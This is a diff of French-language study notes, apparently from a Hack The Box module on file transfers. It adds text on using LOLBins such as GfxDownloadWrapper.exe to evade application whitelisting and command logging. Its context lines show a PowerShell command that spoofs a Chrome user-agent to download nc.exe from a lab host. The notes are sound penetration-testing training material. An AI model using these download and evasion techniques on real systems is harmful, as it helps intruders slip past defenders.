@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T16:10:22.681Z
+date: 2025-05-04T16:11:56.817Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -891,7 +891,7 @@ Les binaires **Living off the Land** peuvent être utilisés pour effectuer des 
 - Exécution de commandes
 - Lecture de fichiers
 - Écriture de fichiers
-- Contournement de sécurité (bypass)
+- Contournement de sécurité ou évasion (bypass)
 
 
 ### Using the LOLBAS and GTFOBins Project
@@ -990,3 +990,7 @@ Utiliser Invoke-WebRequest avec l'user-agent Chrome:
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
+
+### LOLBAS / GTFOBins
+
+L'application de liste blanche peut empêcher l'utilisation de PowerShell ou Netcat, et la journalisation des commandes peut alerter les défenseurs. Une alternative consiste à utiliser un "LOLBIN" (living off the land binary), également appelé "binaire de confiance mal placé". Un exemple est le pilote graphique Intel pour Windows 10 (GfxDownloadWrapper.exe), qui est installé sur certains systèmes et possède une fonctionnalité permettant de télécharger périodiquement des fichiers de configuration. Cette fonctionnalité peut être invoquée de la manière suivante :
